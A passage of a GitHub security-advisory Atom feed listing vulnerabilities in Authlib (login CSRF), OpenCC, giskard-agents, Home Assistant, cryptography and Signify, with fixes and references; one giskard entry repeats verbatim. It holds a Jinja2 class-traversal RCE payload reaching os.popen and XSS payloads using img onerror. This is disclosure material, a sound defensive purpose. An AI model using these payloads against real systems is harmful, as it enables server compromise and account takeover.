<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4539">https://nvd.nist.gov/vuln/detail/CVE-2026-4539</a></li>
<li><a href="https://github.com/pygments/pygments/issues/3058">https://github.com/pygments/pygments/issues/3058</a></li>
<li><a href="https://github.com/pygments/pygments">https://github.com/pygments/pygments</a></li>
<li><a href="https://vuldb.com/?ctiid.352327">https://vuldb.com/?ctiid.352327</a></li>
<li><a href="https://vuldb.com/?id.352327">https://vuldb.com/?id.352327</a></li>
<li><a href="https://vuldb.com/?submit.774685">https://vuldb.com/?submit.774685</a></li>
<li><a href="https://github.com/pygments/pygments/pull/3064">https://github.com/pygments/pygments/pull/3064</a></li>
<li><a href="https://github.com/pygments/pygments/commit/24b8aa76c6cd6d70f39c6dd605cce319c98e2ccc">https://github.com/pygments/pygments/commit/24b8aa76c6cd6d70f39c6dd605cce319c98e2ccc</a></li>
<li><a href="https://github.com/pygments/pygments/releases/tag/2.20.0">https://github.com/pygments/pygments/releases/tag/2.20.0</a></li>
<li><a href="https://github.com/advisories/GHSA-5239-wwwm-4pmq">https://github.com/advisories/GHSA-5239-wwwm-4pmq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5239-wwwm-4pmq</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-22T06:30:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[authlib] Authlib has 1-click Account Takeover vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-fg6f-75jq-6523</id>
        <link href="https://github.com/advisories/GHSA-fg6f-75jq-6523"/>
        <updated>2026-03-30T12:20:15.000Z</updated>
        <content type="html"><![CDATA[<h1 id="security-advisory-cache-backed-state-storage-csrf-in-authlib">Security Advisory: Cache-Backed State Storage CSRF in Authlib</h1>
<p>The Security Labs team at Snyk has reported a security issue affecting Authlib, identified during a recent research project.</p>
<p>The Snyk Security Labs team has identified a vulnerability that can result in a one-click account takeover in applications that utilize the Authlib library.</p>
<h2 id="description">Description</h2>
<p>Cache-backed state/request-token storage is not tied to the initiating user session, making CSRF possible for any attacker that possesses a valid state value (easily obtainable via an attacker-initiated authentication flow). When a cache is supplied to the OAuth client registry, <code>FrameworkIntegration.set_state_data</code> writes the entire state blob under <code>_state_{app}_{state}</code>, and <code>get_state_data</code> disregards the caller's session entirely. [1][2]</p>
<pre><code class="language-py">    def _get_cache_data(self, key):
        value = self.cache.get(key)
        if not value:
            return None
        try:
            return json.loads(value)
        except (TypeError, ValueError):
            return None
[snip]
    def get_state_data(self, session, state):
        key = f"_state_{self.name}_{state}"
        if self.cache:
            value = self._get_cache_data(key)
        else:
            value = session.get(key)
        if value:
            return value.get("data")
        return None
</code></pre>
<p><em>authlib/integrations/base_client/framework_integration.py:12-41</em></p>
<p>Retrieval in <code>authorize_access_token</code> therefore succeeds for whichever browser presents that opaque value, and the token exchange proceeds with the attacker's authorization code. [3]</p>
<pre><code class="language-py">    def authorize_access_token(self, **kwargs):
        """Fetch access token in one step.

        :return: A token dict.
        """
        params = request.args.to_dict(flat=True)
        state = params.get("oauth_token")
        if not state:
            raise OAuthError(description='Missing "oauth_token" parameter')

        data = self.framework.get_state_data(session, state)
        if not data:
            raise OAuthError(description='Missing "request_token" in temporary data')

        params["request_token"] = data["request_token"]
        params.update(kwargs)
        self.framework.clear_state_data(session, state)
        token = self.fetch_access_token(**params)
        self.token = token
        return token
</code></pre>
<p><em>authlib/integrations/flask_client/apps.py:57-76</em></p>
<p>This opens up an avenue for Login CSRF in applications that use cache-backed storage. Depending on the dependent application's implementation (e.g., whether it links accounts in the event of a login CSRF), this could lead to account takeover.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Consider a hypothetical application — AwesomeAuthlibApp. Assume that AwesomeAuthlibApp contains internal logic such that, when an already authenticated user performs a <code>callback</code> request, the application links the newly provided SSO identity to the existing user account associated with that request.</p>
<p>Under these conditions, an attacker can achieve account takeover within the application by performing the following actions:</p>
<ol>
<li>The attacker initiates an SSO OAuth flow but halts the process immediately before the callback request is made to AwesomeAuthlibApp.</li>
<li>The attacker then induces a logged-in user (via phishing, a drive-by attack, or similar means) to perform a GET request containing the attacker's state value and authorization code to the AwesomeAuthlibApp callback endpoint. Because Authlib does not verify whether the state token is bound to the session performing the callback, the callback is processed, the authorization code is sent to the provider, and the account linking proceeds.</li>
</ol>
<p>Once the GET request is executed, the attacker's SSO account becomes permanently linked to the victim's AwesomeAuthlibApp account.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Per the OAuth RFC [4], the state parameter should be tied to the user's session to prevent exactly such scenarios. One straightforward method of mitigating this issue is to continue storing the state in the session even when caching is enabled.</p>
<p>An alternative approach would be to hash the session ID (or another per-user secret derived from the session) into the cache key. This ensures the state remains stored in the cache while still being bound to the session of the user that initiated the OAuth flow.</p>
<h2 id="resources">Resources</h2>
<ul>
<li>[1] <a href="https://github.com/authlib/authlib/blob/260d04edee23d8470057ea659c16fb8a2c7b0dc2/authlib/integrations/flask_client/apps.py#L35">flask_client/apps.py#L35</a></li>
<li>[2] <a href="https://github.com/authlib/authlib/blob/260d04edee23d8470057ea659c16fb8a2c7b0dc2/authlib/integrations/base_client/framework_integration.py#L33">base_client/framework_integration.py#L33</a></li>
<li>[3] <a href="https://github.com/authlib/authlib/blob/260d04edee23d8470057ea659c16fb8a2c7b0dc2/authlib/integrations/flask_client/apps.py#L57">flask_client/apps.py#L57</a></li>
<li>[4] <a href="https://www.rfc-editor.org/rfc/rfc6749#section-10.12">RFC 6749 §10.12</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/authlib/authlib/security/advisories/GHSA-fg6f-75jq-6523">https://github.com/authlib/authlib/security/advisories/GHSA-fg6f-75jq-6523</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-68158">https://nvd.nist.gov/vuln/detail/CVE-2025-68158</a></li>
<li><a href="https://github.com/authlib/authlib/commit/2808378611dd6fb2532b189a9087877d8f0c0489">https://github.com/authlib/authlib/commit/2808378611dd6fb2532b189a9087877d8f0c0489</a></li>
<li><a href="https://github.com/authlib/authlib/commit/7974f45e4d7492ab5f527577677f2770ce423228">https://github.com/authlib/authlib/commit/7974f45e4d7492ab5f527577677f2770ce423228</a></li>
<li><a href="https://github.com/advisories/GHSA-fg6f-75jq-6523">https://github.com/advisories/GHSA-fg6f-75jq-6523</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fg6f-75jq-6523</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-01-08T22:40:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OpenCC] OpenCC  has an Out-of-bounds read when processing truncated UTF-8 input]]></title>
        <id>https://github.com/advisories/GHSA-7fqq-q52p-2jjg</id>
        <link href="https://github.com/advisories/GHSA-7fqq-q52p-2jjg"/>
        <updated>2026-03-29T15:27:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>OpenCC versions before 1.2.0 contain two <code>CWE-125: Out-of-bounds Read</code> issues caused by length validation failures in UTF-8 processing. When handling malformed or truncated UTF-8 input, OpenCC trusted derived length values without enforcing the invariant that processed length must not exceed the remaining input buffer. This could result in out-of-bounds reads during segmentation or conversion.</p>
<h3 id="details">Details</h3>
<p>Two independent code paths in OpenCC failed to enforce the invariant:</p>
<p><code>matchedLength &lt;= remainingLength</code></p>
<p>Both paths assumed derived length values were valid and within input bounds, but did not validate that assumption against the remaining buffer. This created the following failure chain:</p>
<p><code>invalid UTF-8 -&gt; incorrect derived length -&gt; incorrect pointer advance -&gt; remaining-length desynchronization -&gt; out-of-bounds read</code></p>
<p>In <code>MaxMatchSegmentation::Segment</code>, this could desynchronize remaining-length tracking and cause out-of-bounds reads during prefix matching.</p>
<p>In <code>Conversion::Convert(const char*)</code>, similar logic could advance processing past the end of the input string and read beyond the null terminator into adjacent memory. In some cases, unintended heap bytes could be propagated into the conversion result.</p>
<p>PR #1005 fixes both issues by explicitly tracking input boundaries, recomputing remaining length on each iteration, and clamping processed lengths so the buffer-bound invariant is preserved.</p>
<p>Affected versions:</p>
<ul>
<li>All versions before 1.2.0</li>
</ul>
<p>Patched version:</p>
<ul>
<li>1.2.0</li>
</ul>
<h3 id="poc">PoC</h3>
<p>Build a vulnerable version with AddressSanitizer enabled and process input ending with a truncated UTF-8 sequence, such as a missing final byte of a 3-byte character. The original report and ASan reproduction are available in <a href="https://github.com/BYVoid/OpenCC/issues/997">Issue #997</a>.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability may cause process crashes and limited, non-deterministic information disclosure when OpenCC processes malformed or attacker-controlled UTF-8 input. The issue does not indicate arbitrary write or code execution.</p>
<p>OpenCC is distributed through system and language-specific package managers, prebuilt binaries, container images, and downstream software, so affected versions may be present even when it is not listed as a direct dependency. Users should upgrade all installed or bundled copies of OpenCC to 1.2.0 or later.</p>
<h3 id="credit">Credit</h3>
<p>OpenCC thanks @oneafter for reporting the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/BYVoid/OpenCC/security/advisories/GHSA-7fqq-q52p-2jjg">https://github.com/BYVoid/OpenCC/security/advisories/GHSA-7fqq-q52p-2jjg</a></li>
<li><a href="https://github.com/BYVoid/OpenCC/issues/997">https://github.com/BYVoid/OpenCC/issues/997</a></li>
<li><a href="https://github.com/BYVoid/OpenCC/pull/1005">https://github.com/BYVoid/OpenCC/pull/1005</a></li>
<li><a href="https://github.com/BYVoid/OpenCC/releases/tag/ver.1.2.0">https://github.com/BYVoid/OpenCC/releases/tag/ver.1.2.0</a></li>
<li><a href="https://github.com/advisories/GHSA-7fqq-q52p-2jjg">https://github.com/advisories/GHSA-7fqq-q52p-2jjg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7fqq-q52p-2jjg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-29T15:27:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[giskard-agents] Giskard Agents have Server-side template injection via ChatWorkflow.chat() using non-sandboxed Jinja2 Environment]]></title>
        <id>https://github.com/advisories/GHSA-frv4-x25r-588m</id>
        <link href="https://github.com/advisories/GHSA-frv4-x25r-588m"/>
        <updated>2026-03-27T22:17:32.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>ChatWorkflow.chat(message)</code> passes its string argument directly as a Jinja2 template source to a non-sandboxed <code>Environment</code>. A developer who passes user input to this method enables full remote code execution via Jinja2 class traversal.</p>
<p>The method name <code>chat</code> and parameter name <code>message</code> naturally invite passing user input directly, but the string is silently parsed as a Jinja2 template, not treated as plain text.</p>
<h2 id="root-cause">Root Cause</h2>
<p><code>libs/giskard-agents/src/giskard/agents/workflow.py</code> line ~261:</p>
<pre><code class="language-python">def chat(self, message: str | Message | MessageTemplate, role: Role = "user") -&gt; Self:
    if isinstance(message, str):
        message = MessageTemplate(role=role, content_template=message)
</code></pre>
<p>The string becomes <code>content_template</code>, which is parsed by <code>from_string()</code>:</p>
<p><code>libs/giskard-agents/src/giskard/agents/templates/message.py</code> lines 14-15:</p>
<pre><code class="language-python">def render(self, **kwargs: Any) -&gt; Message:
    template = _inline_env.from_string(self.content_template)
    rendered_content = template.render(**kwargs)
</code></pre>
<p>The Jinja2 Environment is not sandboxed:</p>
<p><code>libs/giskard-agents/src/giskard/agents/templates/environment.py</code> line 37:</p>
<pre><code class="language-python">_inline_env = Environment(
    autoescape=False,
    # Not SandboxedEnvironment
)
</code></pre>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-python">from jinja2 import Environment
env = Environment()  # Same as giskard's _inline_env

# Class traversal reaches os.popen
t = env.from_string("{{ ''.__class__.__mro__[1].__subclasses__() | length }}")
print(t.render())  # 342 accessible subclasses

# Full RCE payload (subclass index varies by Python version)
# {{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['os'].popen('id').read() }}
</code></pre>
<p>A developer building a chatbot:</p>
<pre><code class="language-python">workflow = ChatWorkflow(generator=my_llm)
workflow = workflow.chat(user_input)  # user_input parsed as Jinja2 template
result = await workflow.run()          # RCE if user_input contains {{ payload }}
</code></pre>
<p>Note: using <code>.with_inputs(var=user_data)</code> is safe because variable values are not parsed as templates. The issue is only when user strings are passed directly to <code>chat()</code>.</p>
<h2 id="impact">Impact</h2>
<p>Remote code execution on the server hosting any application built with giskard-agents that passes user input to <code>ChatWorkflow.chat()</code>. Attacker can execute system commands, read files, access environment variables.</p>
<p>Affects giskard-agents &lt;=0.3.3 and 1.0.x alpha. Patched in giskard-agents 0.3.4 (stable) and 1.0.2b1 (pre-release).</p>
<h1 id="mitigation">Mitigation</h1>
<p>Update to 0.3.4 (or 1.0.2b1 for the pre-release branch) which includes the fix.</p>
<p>The fix replaces the unsandboxed Jinja2 Environment with <code>SandboxedEnvironment</code>, which blocks attribute access to dunder methods and prevents class traversal chains. <code>SandboxedEnvironment</code> blocks access to attributes starting with <code>_</code>, preventing the <code>__class__.__mro__</code> traversal chain.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Giskard-AI/giskard-oss/security/advisories/GHSA-frv4-x25r-588m">https://github.com/Giskard-AI/giskard-oss/security/advisories/GHSA-frv4-x25r-588m</a></li>
<li><a href="https://github.com/advisories/GHSA-frv4-x25r-588m">https://github.com/advisories/GHSA-frv4-x25r-588m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-frv4-x25r-588m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-27T22:17:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[giskard-agents] Giskard Agents have Server-side template injection via ChatWorkflow.chat() using non-sandboxed Jinja2 Environment]]></title>
        <id>https://github.com/advisories/GHSA-frv4-x25r-588m</id>
        <link href="https://github.com/advisories/GHSA-frv4-x25r-588m"/>
        <updated>2026-03-27T22:17:32.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>ChatWorkflow.chat(message)</code> passes its string argument directly as a Jinja2 template source to a non-sandboxed <code>Environment</code>. A developer who passes user input to this method enables full remote code execution via Jinja2 class traversal.</p>
<p>The method name <code>chat</code> and parameter name <code>message</code> naturally invite passing user input directly, but the string is silently parsed as a Jinja2 template, not treated as plain text.</p>
<h2 id="root-cause">Root Cause</h2>
<p><code>libs/giskard-agents/src/giskard/agents/workflow.py</code> line ~261:</p>
<pre><code class="language-python">def chat(self, message: str | Message | MessageTemplate, role: Role = "user") -&gt; Self:
    if isinstance(message, str):
        message = MessageTemplate(role=role, content_template=message)
</code></pre>
<p>The string becomes <code>content_template</code>, which is parsed by <code>from_string()</code>:</p>
<p><code>libs/giskard-agents/src/giskard/agents/templates/message.py</code> lines 14-15:</p>
<pre><code class="language-python">def render(self, **kwargs: Any) -&gt; Message:
    template = _inline_env.from_string(self.content_template)
    rendered_content = template.render(**kwargs)
</code></pre>
<p>The Jinja2 Environment is not sandboxed:</p>
<p><code>libs/giskard-agents/src/giskard/agents/templates/environment.py</code> line 37:</p>
<pre><code class="language-python">_inline_env = Environment(
    autoescape=False,
    # Not SandboxedEnvironment
)
</code></pre>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-python">from jinja2 import Environment
env = Environment()  # Same as giskard's _inline_env

# Class traversal reaches os.popen
t = env.from_string("{{ ''.__class__.__mro__[1].__subclasses__() | length }}")
print(t.render())  # 342 accessible subclasses

# Full RCE payload (subclass index varies by Python version)
# {{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['os'].popen('id').read() }}
</code></pre>
<p>A developer building a chatbot:</p>
<pre><code class="language-python">workflow = ChatWorkflow(generator=my_llm)
workflow = workflow.chat(user_input)  # user_input parsed as Jinja2 template
result = await workflow.run()          # RCE if user_input contains {{ payload }}
</code></pre>
<p>Note: using <code>.with_inputs(var=user_data)</code> is safe because variable values are not parsed as templates. The issue is only when user strings are passed directly to <code>chat()</code>.</p>
<h2 id="impact">Impact</h2>
<p>Remote code execution on the server hosting any application built with giskard-agents that passes user input to <code>ChatWorkflow.chat()</code>. Attacker can execute system commands, read files, access environment variables.</p>
<p>Affects giskard-agents &lt;=0.3.3 and 1.0.x alpha. Patched in giskard-agents 0.3.4 (stable) and 1.0.2b1 (pre-release).</p>
<h1 id="mitigation">Mitigation</h1>
<p>Update to 0.3.4 (or 1.0.2b1 for the pre-release branch) which includes the fix.</p>
<p>The fix replaces the unsandboxed Jinja2 Environment with <code>SandboxedEnvironment</code>, which blocks attribute access to dunder methods and prevents class traversal chains. <code>SandboxedEnvironment</code> blocks access to attributes starting with <code>_</code>, preventing the <code>__class__.__mro__</code> traversal chain.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Giskard-AI/giskard-oss/security/advisories/GHSA-frv4-x25r-588m">https://github.com/Giskard-AI/giskard-oss/security/advisories/GHSA-frv4-x25r-588m</a></li>
<li><a href="https://github.com/advisories/GHSA-frv4-x25r-588m">https://github.com/advisories/GHSA-frv4-x25r-588m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-frv4-x25r-588m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-27T22:17:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[homeassistant] Home Assistant has stored XSS in history-graphs]]></title>
        <id>https://github.com/advisories/GHSA-46j8-vpx8-6p72</id>
        <link href="https://github.com/advisories/GHSA-46j8-vpx8-6p72"/>
        <updated>2026-03-27T21:48:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The "remaining charge time"-sensor for mobile phones (imported/included from Android Auto it appears) is vulnerable to the same issue as CVE-2025-62172.
<img width="431" height="334" alt="image" src="https://github.com/user-attachments/assets/84e0dfad-b986-4e84-ad0e-674c5da88582">
This also indicates that any sensor showing their name in the history-graph, is likely to be vulnerable to this issue.</p>
<h3 id="details">Details</h3>
<p>Another entity was found which displays the same behavior as in this issue: <a href="https://github.com/home-assistant/core/security/advisories/GHSA-mq77-rv97-285m">CVE-2025-62172</a></p>
<p>The History-graph card will sometimes display the name of the entity it is displaying, when the graph is shown as a line with values on the x and y axis. This appears to be vulnerable to Cross-Site scripting (<em>XSS</em>) as it does not have any output escaping or sanitization.</p>
<p>The PoC in this instance only shows HTML-injection in the form of the <code>&lt;s&gt;</code> -tag being rendered as strike through, but the vulnerability also allows for injecting arbitrary tags which execute JavaScript, like the example given in the PoC description below.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Register a new sensor (or device) or change the name of an existing one, which provides a location</li>
<li>Change the name to something malicious, for example <code>test &lt;img src=x onerror=alert(document.domain) /&gt;</code>
 For a new entity, it should work when setting the name. For old entities, go here:<img width="1300" height="411" alt="image" src="https://github.com/user-attachments/assets/7dbd9afa-2f4b-4d03-9384-d57c53eaff5c">
<img width="1383" height="885" alt="image" src="https://github.com/user-attachments/assets/c4cfba2e-e2d8-4817-92fe-f17ba7877e27">
<img width="387" height="436" alt="image" src="https://github.com/user-attachments/assets/c40e986d-20ca-416e-bcdb-ca1d3afa77a4">
<br>
<img width="392" height="515" alt="image" src="https://github.com/user-attachments/assets/623fcf8c-eef1-4b17-853d-0ff5440aecaa"></li>
</ol>
<p><strong>PS: the example pictures show changing the name of the device-tracker entity, which is wrong. Just change the name of the <code>remaining charge time</code>-sensor in order to validate this finding</strong></p>
<ol start="3">
<li><p>Add a history graph card with the malicious sensor</p>
<img width="696" height="474" alt="image" src="https://github.com/user-attachments/assets/3cda78e6-3db5-4075-8924-ab9fc5759082">
</li>
<li><p>Hover the graph for payload execution</p>
<img width="343" height="196" alt="image" src="https://github.com/user-attachments/assets/99e56169-b06a-4c60-9343-510e5d74af12"></li>
</ol>
<h3 id="impact">Impact</h3>
<p>The impact of this vulnerability is that a user can target other users of the system and perform account takeover through client side exploitation of XSS.</p>
<p>In the context of this system, I believe the vulnerability to be less impactful than the CVSS metric describes. It is not displayed anywhere by default, it is not natural to display this history graph, and it also has no potential for being imported through seemingly innocent integrations. It also appears to rely on having used/using Android Auto. Other devices which has the same sensor can trigger the same vulnerability, and I expect there to exists cloud-based devices that would enable a threat actor to deliver the payload remotely.</p>
<p>Credit: Robin Lunde - <a href="https://robinlunde.com">https://robinlunde.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/home-assistant/core/security/advisories/GHSA-46j8-vpx8-6p72">https://github.com/home-assistant/core/security/advisories/GHSA-46j8-vpx8-6p72</a></li>
<li><a href="https://github.com/home-assistant/core/security/advisories/GHSA-mq77-rv97-285m">https://github.com/home-assistant/core/security/advisories/GHSA-mq77-rv97-285m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33045">https://nvd.nist.gov/vuln/detail/CVE-2026-33045</a></li>
<li><a href="https://github.com/advisories/GHSA-46j8-vpx8-6p72">https://github.com/advisories/GHSA-46j8-vpx8-6p72</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-46j8-vpx8-6p72</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-27T20:35:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[homeassistant] Home Assistant has stored XSS in Map-card through malicious device name]]></title>
        <id>https://github.com/advisories/GHSA-r584-6283-p7xc</id>
        <link href="https://github.com/advisories/GHSA-r584-6283-p7xc"/>
        <updated>2026-03-27T21:48:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An authenticated party can add a malicious name to their device entity, allowing for Cross-Site Scripting attacks against anyone who can see a dashboard with a Map-card which includes that entity. It requires that the victim hovers over an information point (The lines or the dots representing that device's movement, as shown in the screenshot below, with the example showing a html-injection using <code>&lt;s&gt;</code> to strikethrough the text)
<img width="348" height="355" alt="image" src="https://github.com/user-attachments/assets/1af3ef33-3a72-4816-8ade-e6405aace176"></p>
<p>This allows an authenticated user to execute JavaScript in the context of any other users accessing a dashboard.</p>
<h3 id="details">Details</h3>
<p>The vulnerability exists in the map-card by adding a malicious entity and having the property <code>hours_to_show</code> set.
See example below, with the malicious entity being <code>Pixel 9 &lt;s&gt; Fold Robin {{7*7}}</code>:
Map card with malicious device entity:
<img width="338" height="332" alt="image" src="https://github.com/user-attachments/assets/15229cc3-1b69-438c-9ee5-cbfa9483aec9"></p>
<p>YAML-view of same card:
<img width="338" height="198" alt="image" src="https://github.com/user-attachments/assets/cd579266-75c3-4cdf-9d08-1544a6887feb"></p>
<p>This issue largely resembles the issue documented in: <a href="https://github.com/home-assistant/core/security/advisories/GHSA-mq77-rv97-285m">CVE-2025-62172</a>, but with an entity which can be displayed in a Map, instead of in an energy-dashboard.</p>
<h3 id="poc">PoC</h3>
<ol>
<li><p>Register a new sensor (or device) or change the name of an existing one, which provides a location</p>
</li>
<li><p>Change the name to something malicious, for example <code>test &lt;img src=x onerror=alert(document.domain) /&gt;</code>
For a new entity, it should work when setting the name. For old entities, go here:</p>
<img width="1300" height="411" alt="image" src="https://github.com/user-attachments/assets/d240549e-f26c-4617-89d7-5480451ae5a3">
<img width="1383" height="885" alt="image" src="https://github.com/user-attachments/assets/94db6186-ad54-476c-92a3-9f6870b0c862">
<img width="387" height="436" alt="image" src="https://github.com/user-attachments/assets/f4c4b9f6-b1e7-4b50-9012-3be31c617be4">
<br>
<img width="392" height="515" alt="image" src="https://github.com/user-attachments/assets/a0f24d2f-cc18-4ef7-9071-40376dbb38c1">
</li>
<li><p>Add the entity to a map card, which has the "hours to show"-attribute set, to display movement history</p>
<img width="296" height="383" alt="image" src="https://github.com/user-attachments/assets/b2db55b6-3d4b-4ab0-91fe-fc26813ad5ff">
<img width="692" height="410" alt="image" src="https://github.com/user-attachments/assets/aec15e07-12c0-4abf-ba73-979736131c7c"></li>
</ol>
<img width="694" height="302" alt="image" src="https://github.com/user-attachments/assets/e4bb7cac-fe85-41eb-963c-1743e78d937c">

<p>(The left arrow showing the custom setting, and the right arrow showing a data point which needs to be hovered)</p>
<ol start="4">
<li>The payload executes when hovering a data-point (here shown with an "alert(document.domain"-payload)<img width="504" height="118" alt="image" src="https://github.com/user-attachments/assets/9f24e1fe-949f-4fa5-9e4f-781828a1343b"></li>
</ol>
<h3 id="impact">Impact</h3>
<p>The impact of this vulnerability is that a user can target other users of the system and perform account takeover through client side exploitation of XSS.</p>
<p>In the context of this system, I believe the vulnerability to be less impactful than the CVSS metric describes, as it requires a specific setup (map-card with attribute <code>hours_to_show</code> set, as this brings up the trail). It is interesting to note that any user who sets this attribute, will be highly likely to trigger the vulnerability through normal use. It also has no potential for being imported through seemingly innocent integrations and can only be set explicitly by another invited user, a device name, a cloud service or through social engineering. Other devices which has the same sensor can trigger the same vulnerability, and I expect there to exists cloud-based devices that would enable a threat actor to deliver the payload remotely.</p>
<p>Suggested criticality: <strong>Medium</strong></p>
<p>Credit: Robin Lunde - <a href="https://robinlunde.com">https://robinlunde.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/home-assistant/core/security/advisories/GHSA-r584-6283-p7xc">https://github.com/home-assistant/core/security/advisories/GHSA-r584-6283-p7xc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33044">https://nvd.nist.gov/vuln/detail/CVE-2026-33044</a></li>
<li><a href="https://github.com/advisories/GHSA-r584-6283-p7xc">https://github.com/advisories/GHSA-r584-6283-p7xc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r584-6283-p7xc</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-27T20:33:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cryptography] cryptography has incomplete DNS name constraint enforcement on peer names]]></title>
        <id>https://github.com/advisories/GHSA-m959-cc7f-wv43</id>
        <link href="https://github.com/advisories/GHSA-m959-cc7f-wv43"/>
        <updated>2026-03-27T19:56:23.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In versions of cryptography prior to 46.0.5, DNS name constraints were only validated against SANs within child certificates, and not the "peer name" presented during each validation. Consequently, cryptography would allow a peer named <code>bar.example.com</code> to validate against a wildcard leaf certificate for <code>*.example.com</code>, even if the leaf's parent certificate (or upwards) contained an excluded subtree constraint for <code>bar.example.com</code>.</p>
<p>This behavior resulted from a gap between RFC 5280 (which defines Name Constraint semantics) and RFC 9525 (which defines service identity semantics): put together, neither states definitively whether Name Constraints should be applied to peer names. To close this gap, cryptography now conservatively rejects any validation where the peer name would be rejected by a name constraint if it were a SAN instead.</p>
<p>In practice, exploitation of this bypass requires an uncommon X.509 topology, one that the Web PKI avoids because it exhibits these kinds of problems. Consequently, we consider this a medium-to-low impact severity.</p>
<p>See CVE-2025-61727 for a similar bypass in Go's <code>crypto/x509</code>.</p>
<h2 id="remediation">Remediation</h2>
<p>Users should upgrade to 46.0.6 or newer. </p>
<h2 id="attribution">Attribution</h2>
<p>Reporter: @1seal</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyca/cryptography/security/advisories/GHSA-m959-cc7f-wv43">https://github.com/pyca/cryptography/security/advisories/GHSA-m959-cc7f-wv43</a></li>
<li><a href="https://github.com/advisories/GHSA-m959-cc7f-wv43">https://github.com/advisories/GHSA-m959-cc7f-wv43</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m959-cc7f-wv43</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-27T19:56:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[signify] Signify allows a remote attacker to escalate privileges via the signed_data.py and the context.py components]]></title>
        <id>https://github.com/advisories/GHSA-p4hh-mq57-gq8x</id>
        <link href="https://github.com/advisories/GHSA-p4hh-mq57-gq8x"/>
        <updated>2026-03-27T19:50:22.000Z</updated>
        <content type="html"><![CDATA[<p>An issue in ralphje Signify before v.0.9.2 allows a remote attacker to escalate privileges via the signed_data.py and the context.py components</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-70887">https://nvd.nist.gov/vuln/detail/CVE-2025-70887</a></li>
<li><a href="https://github.com/mtrojnar/osslsigncode/issues/475">https://github.com/mtrojnar/osslsigncode/issues/475</a></li>
<li><a href="https://github.com/ralphje/signify/issues/60">https://github.com/ralphje/signify/issues/60</a></li>
<li><a href="https://github.com/mtrojnar/osslsigncode/pull/477">https://github.com/mtrojnar/osslsigncode/pull/477</a></li>
<li><a href="https://github.com/ralphje/signify/commit/64f21c0cc06cea0536370686ca3ba7a01e4adaa8">https://github.com/ralphje/signify/commit/64f21c0cc06cea0536370686ca3ba7a01e4adaa8</a></li>
<li><a href="https://github.com/mtrojnar/osslsigncode/releases/tag/2.11">https://github.com/mtrojnar/osslsigncode/releases/tag/2.11</a></li>
<li><a href="https://github.com/advisories/GHSA-p4hh-mq57-gq8x">https://github.com/advisories/GHSA-p4hh-mq57-gq8x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
